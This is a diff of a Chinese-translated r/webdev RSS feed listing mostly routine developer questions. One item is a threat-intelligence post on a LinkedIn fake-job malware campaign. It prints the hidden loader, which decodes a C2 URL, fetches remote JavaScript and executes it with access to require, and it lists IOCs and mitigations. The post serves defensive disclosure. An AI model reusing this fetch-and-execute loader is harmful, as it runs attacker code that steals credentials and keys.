@@ -4,7 +4,56 @@
     <title>最新提交：webdev</title>
     <link>https://www.reddit.com/r/webdev/new</link>
     <description>致力于所有 Web 开发的社区：前端和后端。有关更多与设计相关的问题，请尝试 /r/web_design。</description>
-    <lastBuildDate>Wed, 17 Dec 2025 15:14:49 GMT</lastBuildDate>
+    <lastBuildDate>Wed, 17 Dec 2025 18:19:15 GMT</lastBuildDate>
+    <item>
+      <title>我在哪里可以找到这个源代码？</title>
+      <link>https://www.reddit.com/r/webdev/comments/1pp322k/where_can_i_find_this_source_code/</link>
+      <description><![CDATA[我很好奇：https://demo.utopia.fyi/ 在任何地方都是开源的吗？ iono 我可以在这里问这个问题吗？干杯   由   提交 /u/Zestyclose-Oven-7863   [链接] [评论]]]></description>
+      <guid>https://www.reddit.com/r/webdev/comments/1pp322k/where_can_i_find_this_source_code/</guid>
+      <pubDate>Wed, 17 Dec 2025 17:49:48 GMT</pubDate>
+    </item>
+    <item>
+      <title>Tailwind 是 CSS 事实上的标准吗？</title>
+      <link>https://www.reddit.com/r/webdev/comments/1pp2yh4/is_tailwind_de_facto_standard_for_css/</link>
+      <description><![CDATA[我非常喜欢 Tailwind，并且倾向于认为它可能是我们迄今为止（或非常接近）编写 CSS 的最佳方式。 它是模块化的，易于学习和使用，并且接近实际的 CSS；你不会忘记实际的 CSS 是如何工作的，你会接近它。对于可重用和可重复的模式，无论如何，您都将它们包含在组件中。 但据我所知有些人不同意，我想展开讨论。大家基本同意我的说法吗？或者您根本不赞成 Tailwind 及其哲学，而是寻找更好的方法来处理 CSS 的事情？如果是这样，为什么以及如何？   由   提交 /u/BinaryIgor   [链接] [评论]]]></description>
+      <guid>https://www.reddit.com/r/webdev/comments/1pp2yh4/is_tailwind_de_facto_standard_for_css/</guid>
+      <pubDate>Wed, 17 Dec 2025 17:46:03 GMT</pubDate>
+    </item>
+    <item>
+      <title>我构建了一个实时地图，跟踪巴黎的 19,000 辆自行车（github 存储库链接）</title>
+      <link>https://www.reddit.com/r/webdev/comments/1pp2tco/i_built_a_realtime_map_tracking_19000_bikes_in/</link>
+      <description><![CDATA[   /u/Glass-Caterpillar-70   [链接] [评论] ]]></description>
+      <guid>https://www.reddit.com/r/webdev/comments/1pp2tco/i_built_a_realtime_map_tracking_19000_bikes_in/</guid>
+      <pubDate>Wed, 17 Dec 2025 17:40:37 GMT</pubDate>
+    </item>
+    <item>
+      <title>氛围设计的艺术</title>
+      <link>https://www.reddit.com/r/webdev/comments/1pp26rc/the_art_of_vibe_design/</link>
+      <description><![CDATA[ 由   提交/u/GlitteringPenalty210   [链接] [评论]]]></description>
+      <guid>https://www.reddit.com/r/webdev/comments/1pp26rc/the_art_of_vibe_design/</guid>
+      <pubDate>Wed, 17 Dec 2025 17:16:28 GMT</pubDate>
+    </item>
+    <item>
+      <title>[架构评论] 带商店的家族企业网站的 Headless WordPress + Astro（混合）</title>
+      <link>https://www.reddit.com/r/webdev/comments/1pp0hms/architecture_review_headless_wordpress_astro/</link>
+      <description><![CDATA[大家好 我想为我们的家族企业建立一个网站。这不是我的主要工作，但我是一名软件开发人员。因此，我不了解 Web 开发或常见技术堆栈的当前状态。我做了很多研究，现在有了一个粗略的想法，需要一些经验丰富的 Web 开发人员进行评估。 我不想在这个项目上花费太多时间。我想尝试人工智能辅助的方式来加速编程并提高我对人工智能工具的了解。 家庭成员将维护网站并填充内容。她不是技术人员，但拥有一些基本的 WordPress 知识。这就是为什么我想使用 WordPress 作为后端。 业务主要以服务为主，但我们也销售很少的产品。因此，我们需要一些有关业务的信息页面和产品的购物系统。 我正在计划一个“无头混合动力”系统。平衡开发体验、性能和易用性的方法。 堆栈：  前端： Astro + React Island + Tailwind。 后端： WordPress + WooCommerce + WPGraphQL。 开发工作流程： Tailwind/React 的人工智能辅助（光标/反重力）   架构：  内容 (SSG)： 主页/关于页面是静态的 价格/商店 (SSR)： 商店页面使用 Astro 混合渲染。他们从 WPGraphQL 实时获取价格。 成本计算器：一个用于估算服务成本的小型交互式 React 应用 结账：为了避免重建支付逻辑，我在 Astro 中处理购物车状态，然后将用户重定向到本机 WooCommerce 结账进行付款。  我的问题：  稳定性：我应该了解 Astro Hybrid + WPGraphQL 的任何生产陷阱吗？ 适合：这个理论想法是否可行？它适合我计划做的事情吗？ 您能建议任何其他技术来实现我的目标吗？  感谢您的反馈！   由   提交 /u/Least-Flatworm7361   [链接] [评论]]]></description>
+      <guid>https://www.reddit.com/r/webdev/comments/1pp0hms/architecture_review_headless_wordpress_astro/</guid>
+      <pubDate>Wed, 17 Dec 2025 16:10:39 GMT</pubDate>
+    </item>
+    <item>
+      <title>我什么时候应该使用动态网站而不是通过客户端 API 调用来获取数据的静态网站？通过前端的 api 调用，有什么是我不能做或不应该做的吗？</title>
+      <link>https://www.reddit.com/r/webdev/comments/1pp07ux/when_should_i_use_a_dynamic_website_instead_of_a/</link>
+      <description><![CDATA[我感觉对于在浏览器中运行的应用程序，我可以使用静态站点和 api 调用完成几乎所有操作。 我错在哪里？ 我能想到的一个限制是，没有离线支持   由   提交 /u/AdVivid1666   [链接] [评论]]]></description>
+      <guid>https://www.reddit.com/r/webdev/comments/1pp07ux/when_should_i_use_a_dynamic_website_instead_of_a/</guid>
+      <pubDate>Wed, 17 Dec 2025 16:00:23 GMT</pubDate>
+    </item>
+    <item>
+      <title>我为自己的第一个“项目”感到自豪</title>
+      <link>https://www.reddit.com/r/webdev/comments/1pp02uj/im_proud_of_myself_for_making_my_first_project/</link>
+      <description><![CDATA[我不知道在哪里发布这个，但我只想说我完成了我的第一个项目（甚至不确定我是否可以称其为项目）。我知道规则规定我不能发布它，所以我不会。但我很高兴！ 我没有编码经验，所有这些数字内容对我这个老家伙来说似乎很可怕，所以说实话，这是使用 chatgpt 的氛围编码。但我做到了，这是我从未想过我能做到的事情。它很简单，没有多余的装饰，但我可以自豪地说这是我做的（当然是在 chatgpt 的帮助下）。 它也表明我从做事中学到了更多。在我的编程之旅中迈出下一步时，我感到更加自在，即使稍微多了一些。我还可以告诉你 github 是什么以及 css、js 和 html 之间的区别 - 我从来没有想过我能够学习这些东西。 仅此而已。只是想发布 b/c 我对此感到非常高兴！！！   由   提交 /u/YesterdayMany4049   [链接] [评论]]]></description>
+      <guid>https://www.reddit.com/r/webdev/comments/1pp02uj/im_proud_of_myself_for_making_my_first_project/</guid>
+      <pubDate>Wed, 17 Dec 2025 15:55:05 GMT</pubDate>
+    </item>
     <item>
       <title>Coursera 与 Udemy 合并</title>
       <link>https://www.reddit.com/r/webdev/comments/1poyfmj/coursera_to_combine_with_udemy/</link>
@@ -60,55 +109,6 @@
       <description><![CDATA[分享我经历过的攻击中的 IOC 和 TTP。 威胁参与者简介： https://www.linkedin.com/in/viktoriia-krysko-951210243 攻击向量：  LinkedIn社会工程 “工作机会”对于前端开发人员 托管在 Bitbucket 上的恶意存储库  负载交付：隐藏在 /server/controllers/product.js 中： javascript const src = atob(process.env.DEV_API_KEY); const Payload = (await axios.get(src)).data.cookie; const handler = new (Function.constructor)(&#39;require&#39;, Payload);处理程序（需要）；  IOC：  C2 URL：https://jsonkeeper.com/b/TCVGF Base64 负载参考： aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1RDVkdG Firebase 项目：react-firebase-s2233d64f8  有效负载特征：  67KB 混淆的 JavaScript 多层替换密码编码 child_process、require、Buffer访问 可能的信息窃取者瞄准凭据、加密货币、SSH 密钥  社会工程 TTP：  专业概念文档 4 步“招聘流程” 紧急（“尽快完成”） 有吸引力的薪酬（45-65 美元/小时）  缓解措施：  沙箱所有不受信任的代码（Docker/VM） 出站防火墙（LuLu、Little Snitch） 执行前扫描危险模式  向当局报告。 分享以保护社区。 DM 我获取完整的恶意软件样本。 #infosec #malware #threatintel #iocs #cybersecurity #developers   由   提交/u/Simple_Log11  [链接] [评论]]]></description>
       <guid>https://www.reddit.com/r/webdev/comments/1pos19x/malware_campaign_targeting_developers_via_linkedin/</guid>
       <pubDate>Wed, 17 Dec 2025 09:10:04 GMT</pubDate>
-    </item>
-    <item>
-      <title>当问题不是您的代码时调试结账问题</title>
-      <link>https://www.reddit.com/r/webdev/comments/1pory83/debugging_checkout_issues_when_the_problem_isnt/</link>
-      <description><![CDATA[前端和后端是可靠的。日志显示请求正在通过，但网关响应终止了事务。当问题是外部的时，很难优化。有开发人员发现网关可以提供更好的透明度或更少的错误拒绝吗？   由   提交 /u/grand001   [链接] [评论]]]></description>
-      <guid>https://www.reddit.com/r/webdev/comments/1pory83/debugging_checkout_issues_when_the_problem_isnt/</guid>
-      <pubDate>Wed, 17 Dec 2025 09:04:21 GMT</pubDate>
-    </item>
-    <item>
-      <title>有没有一种工具可以监视您的代码并在提交之前阻止诸如泄漏密钥或缺少测试之类的愚蠢行为？</title>
-      <link>https://www.reddit.com/r/webdev/comments/1poqe5y/is_there_a_tool_that_watches_your_code_and_stops/</link>
-      <description><![CDATA[我不断看到开发人员（包括我自己）犯下同样愚蠢的错误，只是为了快速测试一些东西，对 API 密钥进行硬编码。控制台记录具有电子邮件或其他 PII 的用户对象，或添加新功能而不为其编写测试（或忘记标头、速率限制等）。 总是有一些关于泄露的 API 密钥或秘密导致大量账单或违规的新闻。 是否有一个工具可以在后台安静地运行，在我保存文件时捕获这些内容，并自动修复它或强制我在提交之前清理它？所有本地没有云，没有帐户，没有打电话回家。 我尝试过 gitleaks 和 trufflehog，但它们主要用于事后扫描，我想要一些始终监视并阻止我在事情发生时立即搞砸的东西。 有这样的事情存在吗？ 谢谢！   由   提交 /u/soumyadyuti_245   [链接] [评论]]]></description>
-      <guid>https://www.reddit.com/r/webdev/comments/1poqe5y/is_there_a_tool_that_watches_your_code_and_stops/</guid>
-      <pubDate>Wed, 17 Dec 2025 07:21:45 GMT</pubDate>
-    </item>
-    <item>
-      <title>我对浮动用户界面有疑问，如何在移动设备上进行调试？</title>
-      <link>https://www.reddit.com/r/webdev/comments/1pop1qb/im_having_issue_with_floating_ui_how_to_debug_on/</link>
-      <description><![CDATA[大家好，我遇到一个问题，我有一个搜索栏，当您键入时，它会显示一个项目列表，旁边有输入内容。它适用于除 ios 之外的所有设备，当我单击弹出窗口中的输入时，它会关闭，这让我发疯，我试图注释一些代码并跟踪问题所在，但没有运气。知道如何追踪问题吗？   由   提交/u/edgetheraited  [链接] [评论]]]></description>
-      <guid>https://www.reddit.com/r/webdev/comments/1pop1qb/im_having_issue_with_floating_ui_how_to_debug_on/</guid>
-      <pubDate>Wed, 17 Dec 2025 06:01:43 GMT</pubDate>
-    </item>
-    <item>
-      <title>您从事过哪些类型的算法难题？</title>
-      <link>https://www.reddit.com/r/webdev/comments/1pooram/in_what_types_of_algorithmichard_problems_have/</link>
-      <description><![CDATA[标题。   由   提交 /u/Spiritual-Agent-8730   [链接] [评论]]]></description>
-      <guid>https://www.reddit.com/r/webdev/comments/1pooram/in_what_types_of_algorithmichard_problems_have/</guid>
-      <pubDate>Wed, 17 Dec 2025 05:45:16 GMT</pubDate>
-    </item>
-    <item>
-      <title>使用 React、Vite 和 Tailwind 构建一次性电子邮件 PWA。仅 RAM 存储，没有日志。</title>
-      <link>https://www.reddit.com/r/webdev/comments/1pok2cl/built_a_disposable_email_pwa_using_react_vite_and/</link>
-      <description><![CDATA[   大家好， 我将 **Mephisto** 构建为一个注重隐私的副业项目。我们的目标是创建一个感觉像本机应用程序而不是杂乱网站的一次性电子邮件服务。 **技术堆栈：** * **核心：** React + TypeScript + Vite * **样式：** Tailwind CSS（以深色主题为主） * **状态：** 用于即时更新的本地状态管理 * **PWA：** 可通过浏览器完全安装 * **安全性：** 用于密码生成的客户端熵 后端在易失性内存上运行，以确保数据严格是短暂的。我非常注重消除摩擦——没有广告，没有验证码，只有传入邮件的即时 Websocket 连接。 实时链接：https://mephistomail.site 我正在寻找有关 React 结构和 PWA 性能的反馈。   由   提交/u/CrowPuzzleheaded6649  [链接] [评论] ]]></description>
-      <guid>https://www.reddit.com/r/webdev/comments/1pok2cl/built_a_disposable_email_pwa_using_react_vite_and/</guid>
-      <pubDate>Wed, 17 Dec 2025 01:45:29 GMT</pubDate>
-    </item>
-    <item>
-      <title>拼图生成应用程序中后台工作人员的最佳方法？</title>
-      <link>https://www.reddit.com/r/webdev/comments/1pojfiv/best_approach_for_background_job_workers_in_a/</link>
-      <description><![CDATA[大家好，正在为我的国际象棋拼图应用程序寻找有关后台工作人员的架构建议。  当前设置： - 使用 PostgreSQL 的 FastAPI 后端 - 后台工作进程处理 CPU 密集型谜题生成（Stockfish 分析） - 每个作业批量分析国际象棋游戏（需要 1-20 分钟，具体取决于游戏数量） - 作业在数据库中排队，工作人员使用 SELECT FOR UPDATE SKIP 选取它们已锁定 问题： 现在我有 1 个工作人员按顺序处理作业。当我扩展到 10-20个并发用户生成谜题时，最好的方法是什么？ 我正在考虑的选项：  共享工作池（3-5个工作人员）- 多个工作人员共享作业队列  - 易于实现（只需运行工作脚本3x） - 工作人员有时可能会闲置 - 用户队列彼此后面  自动缩放工作人员 - 根据队列深度生成工作人员  - 更复杂（需要编排） - 更好的资源利用率 - 在生产中如何处理这个问题？  每个用户专用工作人员（我最初的想法）  - 每个用户在注册时都有自己的工作人员 - 否排队 - 看起来很浪费？ （1000 个用户 = 1000 个空闲进程） 当前技术： - 后端：Python/FastAPI - 数据库：PostgreSQL - Worker：无限循环轮询数据库中的简单 Python 脚本 - 还没有 Celery/Redis/RQ（尽量保持简单） 共享工作池方法是标准的吗？我应该硬着头皮转向 Celery 吗？任何建议表示赞赏！   由   提交/u/Busy-Smile989  [链接] [评论]]]></description>
-      <guid>https://www.reddit.com/r/webdev/comments/1pojfiv/best_approach_for_background_job_workers_in_a/</guid>
-      <pubDate>Wed, 17 Dec 2025 01:14:40 GMT</pubDate>
-    </item>
-    <item>
-      <title>Firefox 146.0 细滚动条有箭头，但有隐藏它们的属性吗？</title>
-      <link>https://www.reddit.com/r/webdev/comments/1poft04/firefox_1460_thin_scrollbars_get_arrows_but_is/</link>
-      <description><![CDATA[       由   提交/u/DuDekilleR07  [链接] [评论] ]]></description>
-      <guid>https://www.reddit.com/r/webdev/comments/1poft04/firefox_1460_thin_scrollbars_get_arrows_but_is/</guid>
-      <pubDate>Tue, 16 Dec 2025 22:33:55 GMT</pubDate>
     </item>
     </channel>
 </rss>
